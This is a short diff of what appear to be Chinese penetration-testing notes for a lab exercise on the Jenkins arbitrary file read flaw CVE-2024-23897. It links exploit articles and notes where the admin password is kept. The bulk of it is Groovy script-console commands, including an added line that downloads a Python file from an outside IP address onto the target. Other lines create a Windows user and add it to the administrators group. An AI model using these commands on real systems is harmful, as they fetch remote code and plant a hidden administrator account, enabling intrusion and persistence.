@@ -1,5 +1,6 @@
 [批量扫描脚本-Jenkins任意文件读取(CVE-2024-23897)](https://mp.weixin.qq.com/s/eES8iWuu1MNJQFUCib5L3Q)
 [CVE-2024-23897 Jenkins 任意文件读取一键利用](https://mp.weixin.qq.com/s/fQd193hBrqKGpC-L7kxHBQ)
+春秋云境 Privilege
 
 # 查找密码
 Jenkins 用户名为 admin, 服务密码在
@@ -9,6 +10,7 @@ Jenkins 用户名为 admin, 服务密码在
 # 命令执行
 Dashboard > Manage Jenkins > 脚本命令执行
 ```bash
+println "curl -o C:/Users/1.py http://1.2.3.4:8000/jenkins.py".execute().text
 println "net user dotast qwer1234! /add".execute().text  
 println "net localgroup administrators dotast /add".execute().text  
 ```
